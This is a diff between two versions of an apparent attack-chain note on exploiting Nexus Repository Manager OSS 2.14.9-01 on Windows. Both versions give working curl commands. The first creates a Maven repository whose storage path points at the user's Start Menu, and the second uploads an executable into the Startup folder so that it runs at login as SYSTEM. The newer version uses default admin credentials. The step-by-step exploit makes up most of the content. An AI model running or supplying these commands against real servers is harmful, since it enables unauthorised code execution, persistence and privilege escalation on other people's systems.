@@ -1,53 +1,50 @@
 ---
 id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
 tags:
-  - nexus
-  - file-upload
+  - unrestricted-file-upload
   - rce
-  - persistence
-  - windows-startup
+  - nexus-repository
+  - maven
+  - windows
+  - privilege-escalation
 type: attack_chain
 tools: []
 tactics:
   - '[[Initial Access]]'
   - '[[Execution]]'
-  - '[[Persistence]]'
+  - '[[Privilege Escalation]]'
 verified: false
 platforms:
   - Web
   - Windows
 submitted: true
-complexity: medium
-created_at: '2023-10-01T00:00:00Z'
+created_at: '2023-10-01T12:00:00Z'
 procedures:
-  - '[[procedures/Create-Custom-Maven-Repository-with-Arbitrary-Storage-Path]]'
-  - >-
-    [[procedures/Upload-Executable-to-Windows-Startup-Folder-via-Maven-Artifact]]
+  - '[[procedures/Create-Malicious-Repository-with-Arbitrary-Storage-Path]]'
+  - '[[procedures/Upload-Malicious-Executable-via-Maven-Artifact-Manipulation]]'
 step_count: 2
 techniques:
   - '[[Exploit Public-Facing Application]]'
+  - '[[Remote File Copy]]'
   - '[[Registry Run Keys - Startup Folder]]'
-  - '[[PowerShell]]'
-updated_at: '2025-12-14T05:32:10.457Z'
+updated_at: '2025-12-14T17:23:28.612Z'
 description: >-
-  Authenticated exploitation of Nexus Repository Manager 2 to create a custom
-  repository with arbitrary storage path and upload executables to the Windows
-  Startup folder for persistent RCE as SYSTEM.
-skill_level: intermediate
-impact_level: high
+  Authenticated exploitation of Nexus Repository Manager 2 vulnerability
+  allowing arbitrary file writes to sensitive Windows paths, enabling RCE
+  through startup folder persistence and privilege escalation to SYSTEM.
 validated: true
 mitre_tactics:
   - '[[Initial Access]]'
   - '[[Execution]]'
-  - '[[Persistence]]'
+  - '[[Privilege Escalation]]'
 mitre_techniques:
   - '[[Exploit Public-Facing Application]]'
+  - '[[Remote File Copy]]'
   - '[[Registry Run Keys - Startup Folder]]'
-  - '[[PowerShell]]'
 ---
 # Unrestricted File Upload in Nexus Repository Manager Leading to RCE via Windows Startup Folder
 
-Multi-stage attack chain demonstrating exploitation of Nexus Repository Manager OSS 2.14.9-01 for arbitrary file writes on Windows, leading to persistent remote code execution as the SYSTEM user.
+Multi-stage attack chain demonstrating exploitation of an unrestricted file upload vulnerability in Nexus Repository Manager OSS 2.14.9-01, allowing authenticated admins to write arbitrary files to the Windows filesystem, culminating in remote code execution via the Startup folder and escalation to SYSTEM privileges for lateral movement.
 
 ## Chain Metrics Dashboard
 
@@ -64,9 +61,9 @@ Multi-stage attack chain demonstrating exploitation of Nexus Repository Manager 
 
 ```mermaid
 graph LR
-    A[Initial Access via Valid Admin Credentials] --> B[Create Custom Repository]
-    B --> C[Upload Executable to Startup Folder]
-    C --> D[Persistence and RCE on Login]
+    A[Initial Access: Authenticated Admin] --> B[Repository Creation with Arbitrary Path]
+    B --> C[Malicious File Upload to Startup Folder]
+    C --> D[RCE on User Login and Privilege Escalation]
 
     style A fill:#e74c3c
     style B fill:#f39c12
@@ -78,90 +75,82 @@ graph LR
 
 ### Required Tools
 
-- [[commands/curl-create-custom-repo]]
-- [[commands/curl-upload-artifact-to-startup]]
+- Web browser or curl for HTTP requests
+- Binary file (e.g., calc.exe) for upload
 
 ### Target Environment
 
-- Nexus Repository Manager OSS 2.14.9-01 running on Windows
-- Web interface accessible (default port 8081)
-- Java-based web application with Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8
+- Nexus Repository Manager OSS 2.14.9-01 running on Windows as SYSTEM
+- Exposed web interface (default port 8081)
+- Maven2 hosted repository support
 
 ### Initial Access Requirements
 
-- Authenticated administrator session (NXSESSIONID cookie required)
-- Network access to the Nexus host
-- No prior access needed beyond valid admin credentials
+- Valid administrator credentials for Nexus
+- Network access to the Nexus web interface
+- No prior access beyond authentication needed
 
 ## Detailed Attack Procedures
 
-### Step 1: Create Custom Repository
-procedure: [[procedures/Create-Custom-Maven-Repository-with-Arbitrary-Storage-Path]]
+### Step 1: Create Malicious Repository
+procedure: [[procedures/Create-Malicious-Repository-with-Arbitrary-Storage-Path]]
 
-**Objective**: Establish a hosted Maven2 repository with an overridden storage URL pointing to a sensitive Windows path, enabling arbitrary file placement.
+**Objective**: Establish a hosted Maven2 repository with an unrestricted storage path pointing two levels below the target directory (e.g., Windows Startup folder) to enable arbitrary file writes.
 
-**Instructions**: Use [[commands/curl-create-custom-repo]] to send a POST request creating the repository with overrideLocalStorageUrl set to the Start Menu path (two levels above Startup):
+**Instructions**: Authenticate as admin and send a POST request to the repositories endpoint with a JSON payload specifying the overrideLocalStorageUrl to a path like file:/c:/Users/myuser/AppData/Roaming/Microsoft/Windows/Start Menu/Programs, adjusted to position two levels below the Startup subfolder.
 
-```bash
-curl -X POST 'http://nexus-host:8081/nexus/service/local/repositories' \
-  -H 'Content-Type: application/json' \
-  -H 'Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770' \
-  -d '{"data":{"repoType":"hosted","id":"5000","name":"MyTestRepo","writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"exposed":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","downloadRemoteIndexes":false,"checksumPolicy":"IGNORE"}}'
-```
-
-**Expected Output**: HTTP 201 Created with JSON confirming repository creation, including the overridden storage URL.
-
-**Success Indicators**:
-- Repository ID 5000 created successfully
-- No validation errors on overrideLocalStorageUrl
-
-### Step 2: Upload Executable
-procedure: [[procedures/Upload-Executable-to-Windows-Startup-Folder-via-Maven-Artifact]]
-
-**Objective**: Upload a malicious executable (e.g., calc.exe) to the Windows Startup folder using manipulated Maven parameters, achieving persistence and RCE on user login.
-
-**Instructions**: Use [[commands/curl-upload-artifact-to-startup]] to POST the file with groupId (g: Programs), artifactId (a: Startup), and version (v: .) to construct the target path relative to the custom storage:
+Use curl to execute the request:
 
 ```bash
-curl -X POST 'http://nexus-host:8081/nexus/service/local/artifact/maven/content' \
-  -H 'Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770' \
-  -F 'r=5000' \
-  -F 'g=Programs' \
-  -F 'a=Startup' \
-  -F 'v=.' \
-  -F 'p=jar' \
-  -F 'c=637' \
-  -F 'e=exe' \
-  -F 'file=@calc.exe'
+curl -u admin:admin123 -X POST http://nexus-server:8081/nexus/service/local/repositories -H "Content-Type: application/json" -d '{"repoType":"hosted","id":"5000","name":"MyTestRepo","provider":"maven2","overrideLocalStorageUrl":"file:/c:/Users/myuser/AppData/Roaming/Microsoft/Windows/Start Menu/Programs"}'
 ```
 
-**Expected Output**: HTTP 201 Created with JSON echoing the parameters; verify file placement at C:/Users/myuser/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/calc.exe.
+**Expected Output**: HTTP 201 Created response confirming repository creation.
 
 **Success Indicators**:
-- File uploaded without path validation errors
-- Executable present in Startup folder, executes on login as SYSTEM
+- Repository ID 5000 is listed in Nexus admin panel
+- No validation errors on the overrideLocalStorageUrl parameter
+
+### Step 2: Upload Malicious Executable
+procedure: [[procedures/Upload-Malicious-Executable-via-Maven-Artifact-Manipulation]]
+
+**Objective**: Upload a malicious executable to the Startup folder by manipulating Maven coordinates (groupId, artifactId, version) to construct the target path, resulting in persistence and RCE on user login.
+
+**Instructions**: Prepare a binary like calc.exe and upload it via the Maven content endpoint, setting repository ID to 5000, groupId to "Startup" (or path segment), artifactId to filename base, version to "." for extension handling, and extension to exe while packaging as jar to bypass filters.
+
+Use curl with multipart/form-data:
+
+```bash
+curl -u admin:admin123 -X POST http://nexus-server:8081/nexus/service/local/artifact/maven/content -F r=5000 -F g=Programs -F a=Startup -F v=. -F p=jar -F c=367 -F e=exe -F file=@calc.exe
+```
+
+**Expected Output**: HTTP 201 Created or success response; verify file presence in C:\Users\myuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc.exe.
+
+**Success Indicators**:
+- File written to Startup folder
+- Executable runs automatically on user login, executing as SYSTEM due to Nexus privileges
 
 ## Attack Chain Summary
 
 ### Key Achievements
 
-1. Bypassed storage restrictions to write files to arbitrary Windows paths
-2. Achieved persistent RCE by placing executable in auto-start location
-3. Enabled privilege escalation and lateral movement as SYSTEM user
+1. Arbitrary directory traversal via overrideLocalStorageUrl for filesystem manipulation
+2. Malicious payload placement in Windows Startup for persistence and RCE
+3. Privilege escalation to SYSTEM enabling lateral movement in the network
 
 ## Technique & Tactic Coverage
 
 ### MITRE ATT&CK Techniques
 
 - [[Exploit Public-Facing Application]]
+- [[Remote File Copy]]
 - [[Registry Run Keys - Startup Folder]]
-- [[PowerShell]]
 
 ### MITRE ATT&CK Tactics
 
 - [[Initial Access]]
 - [[Execution]]
-- [[Persistence]]
+- [[Privilege Escalation]]
 
 ---
-*Last updated: 2023-10-01T00:00:00Z*
+*Last updated: 2023-10-01T12:00:00Z*
